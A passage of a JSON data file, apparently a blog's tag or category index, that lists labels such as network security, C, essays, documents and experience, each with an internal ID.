化","_id":"ckrlq5re40039q0szhn02oepz"},{"name":"网络安全","_id":"ckrlq5re6003iq0szom93qwhm"},{"name":"C","_id":"ckrlq5re8003sq0szi4j7k26k"},{"name":"随笔","_id":"ckrlq5re9003vq0szsb1hknfm"},{"name":"文档","_id":"ckrlq5rec004aq0sz1zo59kgo"},{"name":"经验","_id":"ckrlq5red004dq0sz467tq6xy"}]}}